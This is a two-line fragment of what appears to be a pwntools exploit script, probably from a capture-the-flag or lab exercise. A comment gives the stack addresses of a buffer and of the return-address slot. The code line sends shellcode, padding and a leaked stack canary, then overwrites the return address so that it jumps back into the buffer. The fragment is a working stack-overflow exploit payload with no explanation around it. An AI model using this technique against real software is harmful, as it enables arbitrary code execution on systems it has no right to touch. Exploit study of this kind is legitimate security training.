...
# 0x7fffffffecd0 is where the buffer starts i.e. rbp-0x30, 0x7fffffffed08 is where return address is taken from
p.sendline(shellcode+'B'*8+p64(cookie)+'A'*8+p64(0x7fffffffecd0))
